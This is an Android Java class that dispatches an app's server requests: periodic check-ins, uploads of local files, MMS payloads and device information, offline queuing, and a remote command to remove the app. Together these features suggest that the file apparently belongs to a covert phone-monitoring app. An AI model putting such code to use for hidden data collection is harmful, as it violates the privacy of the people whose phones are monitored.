package com.inet.android.request;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Map;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.db.OperationWithRecordInDataBase;
import com.inet.android.info.DeviceInformation;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

import android.content.Context;

public class RequestList {
	final private static String LOG_TAG = RequestList.class.getSimpleName().toString();
	
	/**
	 * response: 0 - Error; 2 - Setting (OK) 3 - Removal of the app
	 */
	public static void sendPeriodicRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "sendPeriodicRequest", "sendPeriodicRequest");
		PeriodicRequest pr = new PeriodicRequest(mContext);
		pr.sendRequest();

	}

	/**
	 * mapsForData must != null, payloads maybe contains null (This argument is
	 * used when the sender of a MMS)
	 **/
	public static void sendDataRequest(Object mapsForData, Map<String, Object> payloads, final Context mContext) {

		RequestParams params = new RequestParams();
		if (payloads != null)
			if (payloads.containsKey("name"))
				params.put("data[][info][payloads][]", new ByteArrayInputStream((byte[]) payloads.get("path")),
						payloads.get("name").toString());
			else if (payloads.containsKey("file")) {
				try {
					params.put("data[][file]", new File(payloads.get("file").toString()));
					if (AppSettings.getSetting(AppConstants.TYPE_DISPATCH, mContext) == 1) {
						if (NetworkChangeReceiver.isOnline(mContext) != 2) {
							Logging.doLog(LOG_TAG, "isOnline != 2", "isOnline != 2");
							OperationWithRecordInDataBase.insertRecord(params.toString(),
									AppConstants.TYPE_FILE_REQUEST, mContext);
							return;
						}
					}
				} catch (FileNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		params.put("data[]", mapsForData);
		params.put("key", System.currentTimeMillis());
		DataRequest caller = new DataRequest(mContext);
		caller.sendRequest(params);

	}

	/*
	 * send once-only request
	 */

	public static void sendDemandRequest(Object obj, final int infoType, String complete, int version,
			final Context mContext) {
		RequestParams params = new RequestParams();
		params.put("data[]", obj);
		params.put("key", System.currentTimeMillis());
		params.put("list", infoType);
		params.put("version", version);
		params.put("complete", complete);

		DemandRequest demand = new DemandRequest(mContext);
		demand.sendRequest(params, infoType);
				
	

	}

	/**
	 * Sending demand request
	 */
	public static void sendInfoDeviceRequest(Context mContext) {
		DeviceInformation device = new DeviceInformation(mContext);
		device.getInfo();
	}

	/**
	 * Send a request for removal application
	 */
	public static void sendDelRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "sendDelRequest start", "sendDelRequest start");
		DelRequest cleaner = new DelRequest(mContext);
		cleaner.sendRequest();
	}
}
